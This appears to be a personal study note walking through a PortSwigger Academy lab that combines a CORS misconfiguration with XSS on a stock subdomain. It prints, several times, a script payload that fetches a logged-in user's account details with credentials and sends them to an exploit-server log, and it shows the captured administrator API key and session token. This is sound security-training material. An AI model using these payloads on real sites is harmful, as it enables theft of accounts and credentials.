resource: 
- [lab and concept](https://youtu.be/RKe6r63OxXw)
- [medium writeup](https://medium.com/@relzy/day-4-of-portswigger-academy-lab-walkthrough-cors-xxe-injection-6c7d85302e86)

Rectified my rookie mistake this time, by checking every allow origin header i.e. `Access-Control-Allow-Origin: null`
`Access-Control-Allow-Origin: https://sha-bang.com`
`Access-Control-Allow-Origin: *`
![[Pasted image 20260904113450.png]]![[Pasted image 20260904113629.png]]![[Pasted image 20260904114014.png]]

Check for same body with a different scheme/protocol and different domain/subdomain as well
![[Pasted image 20260904114416.png]]![[Pasted image 20260904114827.png]]

Vulnerable to XSS
https://stock.0ab500b5040f90c980f7c381000b000e.web-security-academy.net/?productId=1&storeId=1
![[Pasted image 20260904121631.png]]

<script>
document.location="https://stock.0ab500b5040f90c980f7c381000b000e.web-security-academy.net/?productId=<script>
var req= new XMLHttpRequest();
req.onload= reqmethod;
req.open('get','https://0aa7008304e47309829dfb4500af008f.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqmethod() {
location='https://exploit-0a0800a2041e73b882b9faa8015600db.exploit-server.net/log?key='+this.responseText
};
</script>&storeId=1
</script>

But this code won't work because
So we need to do url encoding. For that purpose go to decoder of burp type the special character and replace them with their url encoded equivalent.

![[Pasted image 20260904122645.png]]

URL Encoded Code:

<script>
document.location="https://stock.0ab500b5040f90c980f7c381000b000e.web-security-academy.net/?productId=<script>
var req= new XMLHttpRequest();
req.onload= reqmethod;
req.open('get','https://0ab500b5040f90c980f7c381000b000e.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqmethod() {
location='https://exploit-0af500fa04e4907780c2c2e1011d00a8.exploit-server.net/log?key='%2bthis.responseText
};
%3c/script>&storeId=1
</script>

Firstly we're redirecting the user to this url
<script> document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>

Then within the url we're running a script to get the account details from stock.xyz as this domain is allowed to request resources from the browser

"http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" 

Using the portswigger academy's payload/script

![[Pasted image 20260904124348.png]]

`"GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22SDwcWNFtIOj550zdaEz3m8AITd4fNMXY%22,%20%20%22sessions%22:%20[%20%20%20%20%224Uqg9U9cHjkhJHrp8GvaaLN4A22gXZz9%22%20%20]} HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"`

Lab Solved!!!
